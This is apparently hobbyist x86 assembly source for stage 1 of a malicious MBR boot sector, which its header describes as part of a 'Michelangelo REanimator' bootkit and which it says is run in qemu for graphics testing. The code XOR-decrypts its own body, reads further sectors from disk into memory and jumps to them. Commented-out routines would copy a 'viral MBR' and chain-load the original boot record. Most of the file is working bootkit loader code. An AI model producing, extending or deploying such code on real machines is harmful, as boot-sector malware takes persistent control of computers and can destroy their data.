[bits 16]
;.286			;masm specific
;.MODEL TINY		;masm specific


;******************************************************************************
;	This is the working demo of stage 1 of the malicious MBR/boot sector
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

.CODE:
org 0x7C00

;******************************************************************************
;SCREEN_WIDTH		equ	0x140							;;320
;SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
;SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
;SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
;OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
;SECTOR_SIZE			equ 0x200
;SCALE_MULTIPLIER	equ 4

;VGA_PAL_INDEX		equ	0x3C8
;VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7c00
mov		sp, ax
sti

;cmp byte [load_vx_paint], 0x78
;xchg bx,bx
;je $load_vx_paint+4

crypt:
	push cs
	pop es
	push cs
	pop ds
	lea si, load_vx_paint
	lea di, load_vx_paint
	mov cx, cryptlen 
	crypt_loop:
		lodsb
		xor al, 12h
		stosb
		loop crypt_loop
	jmp $+4
	
load_vx_paint:
;	signature:
;	db 0x78,0x6f,0x78,0x6f
	mov ax, 0x0		;reset disk
	int 13h

	push cs
	pop es
	push cs
	pop ds
	mov [DefaultDisk], dl
	mov ax, 0x0900
	mov es, ax
	mov ds, ax

	mov cx, 0x1500
	push cx
	
	xor di, di
	xor si, si

	read_sector:
		mov ax, 0x215	;read twenty one sectors of disk
		mov ch, 0
		mov cl, 0xD		;cylinder 0, sector 13 
		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
;		mov dl, [DefaultDisk]
		mov bx, 0x200
		int 13h
		
	pop cx

	copy_sector_loop:
		mov word ax, [bx]
		stosw
		;mov word [es:di], ax
		add bx,2
		dec cx
		cmp cx, 0
		jnz copy_sector_loop
	;cmp byte [copy_replay], 0x0
	;jz idontplaytagb
	;cmp byte [copy_replay], 0x1
	;jz load_OG_mbr
	jmp idontplaytagb

;copy_vx_MBR:	
;;	xchg bx, bx
;	push cs						;copy the code here (the viral MBR) 
;	pop es						;to address 0000:0x600
;	mov di, 0x600				;this is typical MBR behavior
;	mov bx, VX_BOOT ;ax=VXBOOT
;;	;xor si, si
;	mov byte [copy_replay], 0x1
;;	xchg bx, bx
;	mov cx, 0x100
;	jmp copy_sector_loop	
;
;	;copy original MBR to this address 0000:0x7c00
;	;
;
;load_OG_mbr:
;	mov ax, 0x201	;read one sectors of disk
;	mov ch, 0		;retrieve OG MBR
;	mov cl, 3		;cylinder 0, sector 3 
;	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
;	mov bx, 0x200
;	int 13h
;	
;
;copy_OG_MBR:
;	;mov ax, 0x07c0
;	;mov es, ax
;	;mov ds, ax
;	push cs
;	pop es
;	mov di, 0x7C00				;this is typical MBR behavior
;	;mov di, 0x7E00				;this is typical MBR behavior
;	mov bx, 0x200
;	xor di, di
;	mov byte [copy_replay], 0x0
;	mov cx, 0x100
;	jmp copy_sector_loop	

idontplaytagb:	
	jmp boot2nd:0

;sector_num equ sector_count+num_sectors

DefaultDisk:
	db 0x80

boot2nd equ 0x900
cryptlen equ $-crypt

copy_replay:
	db 0x2

partition_start:	
	times 0x1BE-($-$$) db 0

driverrollupthepartitionplz:
db 0x80, 0x01, 0x01, 0x00, 0x06, 0x1f, 0xbf, 0x08, 0x3f, 0x00, 0x00, 0x00, 0xc1, 0xfe, 0x0f, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

VXend:
	db 0x55
	db 0xAA

